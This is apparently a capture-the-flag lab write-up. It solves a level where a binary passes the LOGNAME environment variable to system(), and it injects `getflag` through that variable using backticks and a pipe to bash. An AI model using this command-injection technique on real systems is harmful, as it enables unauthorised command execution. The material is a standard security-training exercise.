@@ -1,0 +1,28 @@
+$ ./level07
+level07
+
+seems like we got the username or groupname or something like that. 
+
+we can see with 'strings'
+:
+-> system
+
+--> /bin/echo $s
+
+---> LOGNAME
+
+$ env
+...
+LOGNAME=level07 
+...
+
+$ LOGNAME=coucou
+$ ./level07
+coucou
+$ LOGNAME=getflag
+$ ./level07
+getflag
+$ LOGNAME="getflag | bash"
+OR
+env -i LOGNAME=\`getflag\` ./level07
+Check flag.Here is your token : fium[...]
